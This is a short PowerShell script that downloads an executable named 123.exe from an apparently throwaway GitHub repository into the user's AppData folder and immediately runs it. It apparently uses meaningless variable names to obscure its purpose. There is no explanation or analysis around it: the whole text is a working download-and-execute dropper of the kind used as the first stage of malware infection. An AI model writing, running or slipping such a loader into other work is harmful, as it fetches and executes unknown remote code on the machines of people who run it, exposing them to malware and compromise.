$gfgff = @(
    "https://github.com/dfgsgsdfgfd/test/raw/refs/heads/main/123.exe"
)
$dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
foreach ($link in $gfgff) {
    $dgfsgfd = Split-Path -Leaf $link
    $sgdf = Join-Path -Path $dfsgsfdg -ChildPath $dgfsgfd
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($link, $sgdf)
    Start-Process -FilePath $sgdf
}
